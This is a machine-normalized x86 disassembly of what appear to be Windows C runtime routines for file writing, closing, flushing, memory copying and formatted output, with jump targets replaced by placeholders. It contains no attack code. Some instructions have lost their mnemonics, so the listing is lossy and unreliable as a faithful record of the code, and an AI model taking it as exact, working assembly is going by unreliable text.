and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_1000ecdb
mov [ eax ] 0x1c
call sub_1000ecee
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_1000ed01
pop ecx
jmp r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_10017dde
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_10017bb0
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_10017d8c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_10017d8c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_10017bb0
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_10010723
push 0x10
push r--data
call sub_1000ed24
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1000ecee
and [ eax ] 0x0
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] edi
call sub_1000ecdb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000d8e6
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1000ed69
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1000e645
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000fff0
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100107f5
mov eax [ ebp - 0x1c ]
sub_100107ff
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_1000c4bf
pop ecx
push eax
call sub_10010723
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_10010867
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_100107ff
pop ecx
test eax eax
je r-xdata
push esi
call sub_100108af
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_1000c4bf
push eax
call sub_10017e2b
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_100108af
push 0x14
push r--data
call sub_1000ed24
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_100120e7
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10010980
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_1000ed69
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_1000f024
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_10010951
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_10010867
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_10010867
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_100109a0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10010a28 ]
jmp [ ecx * 4 + jump_table_10010aa8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10010b14 ]
pop esi
pop edi
pop ebp
jmp sub_10011d25
jmp [ ecx * 4 + jump_table_10010cb0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10010bb4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10010cb0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10010b14 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10010cb0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10010b14 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10010b14 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10010b14 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10010cb0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10010cb0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10010cb0 ]
sub_10010d05
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1000e5ce
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_1000ed01
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_1000e5ce
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_1000e5ce
push 0x1
mov edi eax
call sub_1000e5ce
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_1000e548
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_10010da1
push 0x10
push r--data
call sub_1000ed24
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1000ecee
and [ eax ] 0x0
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] edi
call sub_1000ecdb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000d8e6
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1000ed69
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1000e645
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_10010d05
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10010e64
mov eax [ ebp - 0x1c ]
sub_10010e6e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_1000ced5
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_10010e9f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_10013c5b
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_10013c5b
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_10017f0c
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_10013be0
mov [ esi ] eax
add esi 0x4
push esi
call sub_10013be0
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10015b0e
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10015b0e
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_10013be0
pop ecx
mov [ rw-data ] eax
sub_10010f59
mov edi edi
push esi
push 0x4
push 0x20
call sub_10015ac2
mov esi eax
push esi
call sub_10013be0
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_10010f8a
push 0xc
push r--data
call sub_1000ed24
call sub_10012c7a
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10010e9f
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10010fc0
mov eax [ ebp - 0x1c ]
call sub_1000ed69
retn
sub_10010fec
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_10013c5b
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_10011014
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10011060
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_1000fe8a
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_10011093
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_10011060
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_100110b9
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_10011060
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_1000ecdb
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_10011060
sub_10011106
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_1000d1a7
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1000ecdb
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_1000c4bf
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_10011c9e
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
